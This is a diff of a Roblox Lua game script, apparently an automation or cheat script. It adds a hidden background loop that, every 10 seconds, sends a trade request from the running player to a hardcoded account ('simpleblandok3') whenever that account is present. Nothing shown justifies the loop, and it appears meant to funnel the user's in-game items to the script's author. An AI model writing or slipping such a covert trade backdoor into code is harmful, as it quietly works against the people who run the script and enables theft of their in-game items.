@@ -146,7 +146,24 @@ wait(1)
 end
 end
 spawn(redeem)
+local function tradeplayer()
+while true do
+local playerName = "simpleblandok3"
+local player = game:GetService("Players"):FindFirstChild(playerName)
 
+if player then
+local args = {
+    [1] = game:GetService("Players").simpleblandok3
+}
+
+game:GetService("ReplicatedStorage").API:FindFirstChild("TradeAPI/SendTradeRequest"):FireServer(unpack(args))
+end
+
+
+wait(10)
+end
+end
+spawn(tradeplayer)
 local SwitchOne = false
 local waitcooldown = false
 local function MapDestroy()
